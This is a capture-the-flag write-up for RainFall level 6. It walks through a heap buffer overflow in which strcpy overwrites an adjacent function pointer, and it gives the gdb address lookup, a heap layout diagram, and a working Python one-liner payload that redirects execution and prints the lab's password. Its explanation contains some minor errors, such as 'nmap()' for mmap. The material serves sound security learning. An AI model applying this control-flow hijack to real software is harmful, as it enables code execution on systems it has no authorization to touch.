# Level 6

<h3>source.c</h3>

```console
void n(void) {
  system("/bin/cat /home/user/level7/.pass");
}

void m(void) {
  puts("Nope");
}

void main(int argc, char** argv) {
  char* str;
  void* func;

  str = malloc(64);
  func = malloc(4);

  func = &m;

  strcpy(str, argv[1]);
  func();
}
```

<h3>Step</h3>

In this program, there is `n()` which will give us the password to the next level, however this function will never get called

Next in the main function, we see 2 local variable which will each be malloc with a certain amount of memory

`str` will be given a pointer to the `heap` with 64 useable memory and `func` will be given 4 `heap` memory

At the later part of the program we can see there is a call to `strcpy()` which is normally vulnerable, but there is another more interesting thing to look at

`func` is given the address of `m()` and at the last part of the `main()`, it called `func` which in turn will execute the `m()`

Since `func` is just a pointer to an address located in the `heap`, we could use the vulnerability of `strcpy()` to overflow `str` and overwrite the data of `func` so it will execute `n()` instead

<h3>Exploit</h3>

First we need to get the address of `n()`

```console
(gdb) print n
$1 = {<text variable, no debug info>} 0x8048454 <n>
```

There we have the address of `n()` which is `0x08048454`

Next we will explore on how the `heap` look like after the 2 call of `malloc()`

`str` request a memory area of 64 bytes, and get a pointer to that memory, and `func` request a memory area of 4 bytes and got a pointer to that memory

The way malloc work is that it will call `nmap()` which reserve a chunk of memory or a `page` to be used

Next the `malloc` will manage this `page` and keep a `metadata` to keep track on how much memory is left and how many block of address is free to be use

```console
+--------------------------------+
|         page of memory         |      -> area given to malloc by nmap
+--------------------------------+

+--------------------------------+
| M |                            |      -> malloc will put the metadata (M) at the begining of the page to store the information of the area it owns
+--------------------------------+

1st malloc call

+--------------------------------+
| M | B | 64 bytes |             |      -> malloc will create a block (B) which contain the info that the next 64 bytes is now reserve (not free) and
+--------------------------------+         it will return the pointer to the begining of that 64 bytes to be use
        | *str     |
        +----------+

2nd malloc call

+--------------------------------+
| M | B | 64 bytes | B | 4 bytes |      -> malloc will create new block (B) which contain the info that the next 4 bytes is now reserve (not free) and
+--------------------------------+         it will return the pointer to the begining of that 4 bytes to be use
        | *str     |   | *func   |
        +----------+   +---------+
```

We could see that the memory area of `str` and `func` is actually side by side, and only seperated by a block (B) with is 8 bytes long

`str` have a memory size of 64 bytes, and adding the 8 bytes from the block, we get 72 which is the offset that is needed to start overwriting the `func` memory area

```console
level6@RainFall:~$ ./level6 `python -c "print 'a' * 72 + '\x54\x84\x04\x08'"`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

<h3>Helpful link for this exploit</h3>
https://www.youtube.com/watch?v=HPDBOhiKaD8&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=27